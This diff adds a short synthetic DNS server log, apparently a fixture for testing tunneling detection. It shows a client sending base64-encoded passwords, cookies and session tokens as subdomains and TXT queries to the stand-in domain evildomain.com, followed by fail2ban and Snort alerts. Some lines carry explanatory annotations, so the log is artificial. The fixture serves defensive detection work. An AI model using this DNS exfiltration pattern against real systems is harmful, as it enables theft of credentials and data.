@@ -1,0 +1,19 @@
+Jul 28 14:00:01 dns-server dnsmasq[11010]: query[A] cmFuZG9tIHN0cmluZw==.evildomain.com from 10.0.1.100
+Jul 28 14:00:02 dns-server dnsmasq[11011]: query[A] cGFzc3dvcmQxMjM0NQ==.evildomain.com from 10.0.1.100
+Jul 28 14:00:03 dns-server dnsmasq[11012]: query[A] Y29va2llIGRhdGE=.evildomain.com from 10.0.1.100
+Jul 28 14:00:04 dns-server dnsmasq[11013]: query[A] c2Vzc2lvbiB0b2tlbg==.evildomain.com from 10.0.1.100
+Jul 28 14:00:05 dns-server dnsmasq[11014]: query[A] NTBlZDIyYzQ4YjZlZjI4YjY2MTQ3YzQxLmV2aWxkb21haW4uY29t from 10.0.1.100
+Jul 28 14:00:06 dns-server dnsmasq[11015]: query[A] NTI4M2I5ZDc2YzFjM2I3YjE0ZWI3MjgwLmV2aWxkb21haW4uY29t from 10.0.1.100
+Jul 28 14:00:07 dns-server dnsmasq[11016]: query[A] Njc4ZjI5YzFlMjVlM2I3YzI5ODc0YTIxLmV2aWxkb21haW4uY29t from 10.0.1.100
+Jul 28 14:00:30 dns-server dnsmasq[11020]: query[TXT] 1.exfil.evildomain.com from 10.0.1.100 (response: "ZGF0YQo=")
+Jul 28 14:00:31 dns-server dnsmasq[11021]: query[TXT] 2.exfil.evildomain.com from 10.0.1.100 (response: "cGFzc3dkCg==")
+Jul 28 14:00:32 dns-server dnsmasq[11022]: query[TXT] 3.exfil.evildomain.com from 10.0.1.100 (response: "aHlwZXIK")
+Jul 28 14:00:33 dns-server dnsmasq[11023]: query[TXT] 4.exfil.evildomain.com from 10.0.1.100 (response: "Y3JlZGl0Cg==")
+Jul 28 14:00:34 dns-server dnsmasq[11024]: query[TXT] 5.exfil.evildomain.com from 10.0.1.100 (response: "c3NsCg==")
+Jul 28 14:00:35 dns-server dnsmasq[11025]: query[TXT] 6.exfil.evildomain.com from 10.0.1.100 (response: "YmFuaw==")
+Jul 28 14:01:00 dns-server dnsmasq[11030]: query[NS] evildomain.com from 10.0.1.100 (suspicious - high query volume)
+Jul 28 14:01:15 dns-server dnsmasq[11035]: query[TXT] base64encode.evildomain.com from 10.0.1.100 (response length: 1450 bytes)
+Jul 28 14:01:30 dns-server dnsmasq[11040]: query[TXT] 185.220.107.30 from 10.0.1.100 (exfiltrating IP address via DNS)
+Jul 28 14:02:00 dns-server fail2ban[11045]: [dns] DNS tunneling alert - client 10.0.1.100 has 150+ TXT queries for evildomain.com in 60 seconds
+Jul 28 14:02:30 dns-server snort[11050]: [1:2000002:1] ET TROJAN DNS Query to Known Malicious Domain - evildomain.com - Score: 85
+Jul 28 14:03:00 dns-server dnsmasq[11055]: query[ANY] evildomain.com from 10.0.1.100 - DNS tunneling data exfiltration detected by pattern analysis
